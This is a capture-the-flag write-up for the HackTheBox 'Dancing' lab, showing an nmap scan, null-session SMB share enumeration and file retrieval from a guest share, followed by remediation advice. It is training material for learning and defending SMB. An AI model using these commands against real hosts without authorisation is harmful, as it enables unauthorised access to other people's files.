# Dancing - HackTheBox Writeup 💃

## 🚩 Room Information
- **Platform:** [HackTheBox](https://app.hackthebox.com/)
- **Track:** Starting Point - Tier 0
- **Difficulty:** Very Easy
- **Category:** Network Services / SMB Shares
- **Status:** ✅ Completed

---

## 🎓 Learning Objectives
- Understanding Server Message Block (**SMB**) protocol operation.
- Enumerating network share names using `smbclient`.
- Connecting to unauthenticated guest shares to retrieve remote files.

---

## 🧠 Knowledge Required
- Basic usage of `smbclient` utility.
- Understanding Windows network share permissions and Null sessions.

---

## 🔍 Step-by-Step Walkthrough

### 1. Port Enumeration
Execute an Nmap scan targeting common SMB ports:
```bash
nmap -sV -p 139,445 <TARGET_IP>
```
* **Discovered Open Port:** `445/tcp` running `microsoft-ds` (SMB).

### 2. Share Enumeration
List all publicly accessible SMB shares using `smbclient` with a null session:
```bash
smbclient -L //<TARGET_IP>/ -N
```
* **Discovered Shares:**
  - `ADMIN$`
  - `C$`
  - `IPC$`
  - `WorkShares` *(Custom share open for guest read access)*

### 3. Exploitation & Share Browsing
Connect to the `WorkShares` share without password credentials:
```bash
smbclient //<TARGET_IP>/WorkShares -N
```

Navigate through directories to find stored files:
```smb
smb: \> ls
smb: \> cd Amy.Shares
smb: \Amy.Shares\> ls
smb: \Amy.Shares\> get workshares.txt
smb: \Amy.Shares\> cd ..\James.Shares
smb: \James.Shares\> ls
smb: \James.Shares\> get flag.txt
```

### 4. Reading the Flag
Exit `smbclient` and view the downloaded file:
```bash
cat flag.txt
```

---

## 🛡️ Remediation & Key Takeaways
- **Restrict Guest Access:** Disable unauthenticated guest access to custom SMB shares.
- **Principle of Least Privilege:** Strictly control share and NTFS permissions to prevent unauthorized file enumeration.

---
*Based on HackTheBox content. Compiled by [Amit Padhan](https://github.com/amitpadhan525)*
